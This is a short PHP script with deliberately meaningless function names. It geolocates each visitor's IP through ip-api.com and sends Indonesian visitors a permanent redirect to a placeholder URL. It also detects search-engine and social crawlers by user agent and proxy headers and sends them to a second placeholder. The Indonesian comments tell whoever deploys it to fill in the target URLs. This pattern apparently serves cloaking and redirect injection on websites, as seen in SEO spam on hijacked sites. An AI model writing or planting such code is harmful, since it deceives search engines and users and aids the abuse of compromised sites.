<?php

function phubo_nang() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

function chau_cibai() {
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    $bots = [
        'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot',
        'facebot', 'facebookexternalhit', 'ia_archiver', 'mj12bot', 'semrushbot',
        'rogerbot', 'ahrefsbot', 'spbot', 'pinterestbot', 'linkedinbot', 'telegrambot',
        'twitterbot', 'applebot', 'googlebot-mobile'
    ];

    foreach ($bots as $bot) {
        if (strpos($userAgent, $bot) !== false) {
            return true;
        }
    }

    $botHeaders = ['x-forwarded-for', 'via', 'client-ip', 'x-real-ip'];
    foreach ($botHeaders as $header) {
        if (isset($_SERVER[$header])) {
            return true;
        }
    }

    return false;
}
//endpoint //pastikan curl ON
function lan_ciau($ip) {
    $url = 'http://ip-api.com/json/' . $ip;

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    $response = curl_exec($ch);
    curl_close($ch);

    if ($response === false) {
        return null;
    }

    return json_decode($response, true);
}
$visitor_ip = phubo_nang();
$result = lan_ciau($visitor_ip);

//ganti xxxxx ke url
if ($result) {
    $country = isset($result['country']) ? $result['country'] : 'Unknown';
    if ($country === 'Indonesia') {
        header("Location: xxxxxxx", true, 301);
        exit();
    }
}

if (chau_cibai()) {
    header("Location: xxxxxxxxx", true, 301);
    exit();
}

?>
